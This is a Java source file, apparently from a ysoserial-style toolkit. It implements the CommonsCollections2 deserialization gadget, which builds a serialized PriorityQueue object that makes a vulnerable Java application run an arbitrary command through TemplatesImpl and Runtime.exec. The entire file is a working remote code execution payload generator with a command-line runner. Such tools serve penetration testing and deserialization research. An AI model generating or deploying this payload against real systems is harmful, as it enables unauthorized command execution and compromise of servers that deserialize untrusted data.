package com.h2tg.ysogate.payloads.gadgets;

import java.util.PriorityQueue;
import java.util.Queue;

import com.h2tg.ysogate.utils.PayloadRunner;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import com.h2tg.ysogate.payloads.CommandObjectPayload;
import com.h2tg.ysogate.annotation.Authors;
import com.h2tg.ysogate.annotation.Dependencies;
import com.h2tg.ysogate.utils.Gadgets;
import com.h2tg.ysogate.utils.Reflections;


/*
	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				...
					TransformingComparator.compare()
						InvokerTransformer.transform()
							Method.invoke()
								Runtime.exec()
 */

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Authors({Authors.FROHOFF})
public class CommonsCollections2 implements CommandObjectPayload<Queue<Object>>
{

	public Queue<Object> getObject(final String command) throws Exception {
		final Object                templates   = Gadgets.createTemplatesImpl(command);
		final InvokerTransformer    transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
		final PriorityQueue<Object> queue       = new PriorityQueue<Object>(2, new TransformingComparator(transformer));
		queue.add(1);
		queue.add(1);

		Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
		Reflections.setFieldValue(queue, "queue", new Object[]{templates, templates});

		return queue;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections2.class, args);
	}
}
